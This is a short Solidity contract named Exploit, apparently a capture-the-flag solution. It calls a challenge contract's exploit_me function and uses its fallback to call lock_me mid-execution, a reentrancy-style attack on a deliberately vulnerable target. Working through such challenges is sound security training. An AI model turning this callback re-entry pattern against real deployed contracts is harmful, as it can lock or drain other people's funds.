// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IChallenge {
function exploit_me(string memory _name) external;
function lock_me() external;
}

contract Exploit {
    address payable public targetContract;
    IChallenge public challenge;

    constructor(address payable _target) {
        // targetContract = _target;
        challenge = IChallenge(_target);
    }

    function attack(string memory _name) public {
        // targetContract.call(abi.encodeWithSignature("exploit_me(string)", _name));
        // targetContract.call(abi.encodeWithSignature("lock_me()"));
        challenge.exploit_me(_name);
    }

    receive () external payable {}

    fallback() external payable {
        challenge.lock_me();
    }
}